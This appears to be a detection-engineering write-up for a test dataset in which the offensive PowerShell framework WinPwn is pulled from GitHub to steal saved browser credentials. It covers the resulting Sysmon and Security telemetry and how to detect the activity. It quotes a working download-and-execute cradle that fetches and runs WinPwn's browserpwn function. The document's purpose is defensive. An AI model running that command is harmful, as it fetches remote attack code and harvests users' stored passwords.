# T1555.003-11: Credentials from Web Browsers — WinPwn - BrowserPwn

## Technique Context

MITRE ATT&CK T1555.003 (Credentials from Web Browsers) includes credential theft via offensive PowerShell frameworks. WinPwn is a PowerShell-based post-exploitation framework developed by S3cur3Th1sSh1t that consolidates many Windows attack techniques. Its `browserpwn` function targets saved browser credentials across Chromium-based browsers and Firefox. This test downloads WinPwn directly from GitHub at runtime (`iex` with `Invoke-WebRequest` equivalent) and invokes `browserpwn -consoleoutput -noninteractive`, representing a common living-off-the-land pattern where tooling is pulled from the internet rather than pre-staged.

## What This Dataset Contains

**Command executed (Security 4688 and Sysmon EID=1):**
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring(
  'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
browserpwn -consoleoutput -noninteractive}
```

**PowerShell 4104 script blocks:**
- The `iex ... downloadstring(...)` block and `browserpwn -consoleoutput -noninteractive` were captured verbatim, including the pinned commit hash of the WinPwn repo.

**Sysmon EID=22 (DNS Query):**
- DNS query for `raw.githubusercontent.com` resolved to `185.199.108-111.133` (GitHub CDN IPs) — the download request is evidenced by DNS telemetry.

**Sysmon EID=3 (Network Connection) — notable:**
- Multiple outbound connections from `MsMpEng.exe` (Windows Defender) to `48.211.71.198:443` at the time of execution. This is Defender performing cloud-based reputation lookups and submitting the downloaded script content for analysis — telemetry showing Defender actively engaging with the download.

**Sysmon EID=1 (Process Create):**
- `whoami.exe` (T1033), child `powershell.exe` (T1059.001), and `WmiPrvSE.exe` (-Embedding) — the WMI provider host spawned, consistent with WinPwn using WMI for some operations.

**Security events:**
- 4624 (Logon Type 5 - Service) and 4627/4672 (Special Privileges) for SYSTEM — WmiPrvSE spawning triggered a local service logon chain.
- `svchost.exe -k netsvcs -p -s NetSetupSvc` spawned — side effect of the WMI activity.

**Exit codes:** All PowerShell processes exited `0x0`.

## What This Dataset Does Not Contain (and Why)

**Evidence of successful credential extraction:** The dataset contains no EID=11 file writes to credential staging locations, no Chromium database access, and no Firefox profile access. WinPwn's `browserpwn` function requires browser profiles to exist under the executing user's context — the SYSTEM account has no browser installations. The function ran but found nothing.

**WinPwn script content beyond the entry point:** The full WinPwn.ps1 script would have been logged in many 4104 blocks if it were permitted to load — however, Windows Defender AMSI scanning intercepted the script content on download and either blocked it or flagged it. The downloaded script does not appear in 4104 telemetry beyond the invocation line itself, suggesting AMSI neutralized the payload before full execution.

**Browser process access (EID=10 on browser processes):** No browser processes were running; there were no targets for cross-process handle access.

**Defender block event in this dataset:** While Defender's cloud connections appear in EID=3 and AMSI likely processed the payload, no explicit Defender detection log (e.g., Windows Defender/Operational) was collected in this dataset's channels. The Sysmon EID=3 from MsMpEng is the indirect signal.

## Assessment

This dataset documents a download-and-execute pattern for WinPwn that is blocked or neutered by Windows Defender AMSI before meaningful credential access occurs. The detection surface here is the download mechanism itself — `iex(new-object net.webclient).downloadstring(...)` is a well-known PowerShell cradle detectable in 4104 script blocks. The Defender cloud lookups visible in Sysmon EID=3 (MsMpEng outbound) provide a secondary behavioral indicator of AV engagement. The WMI activity (WmiPrvSE spawning) and the associated logon events show that WinPwn's framework components partially initialized before being stopped.

## Detection Opportunities Present in This Data

- **PowerShell 4104 script block** contains `iex(new-object net.webclient).downloadstring(...)` — a high-priority detection pattern; also contains the specific WinPwn GitHub URL and commit hash for threat intelligence correlation.
- **Sysmon EID=22 (DNS)** for `raw.githubusercontent.com` from a SYSTEM-context PowerShell process is a behavioral anomaly, especially combined with `iex` usage.
- **Sysmon EID=3** from `MsMpEng.exe` outbound to public IPs during the execution window is an indirect indicator of Defender cloud engagement — useful as corroboration.
- **Security 4688** captures the `iex ... browserpwn` command line — detectable without script block logging.
- **Security 4624 Logon Type 5 + 4672 Special Privileges** for SYSTEM at time of execution indicates WMI service activity worth correlating with the parent PowerShell.
- **Sysmon EID=1** on `WmiPrvSE.exe -Embedding` spawned from a PowerShell process (rather than from svchost) is an anomalous parent-child relationship.
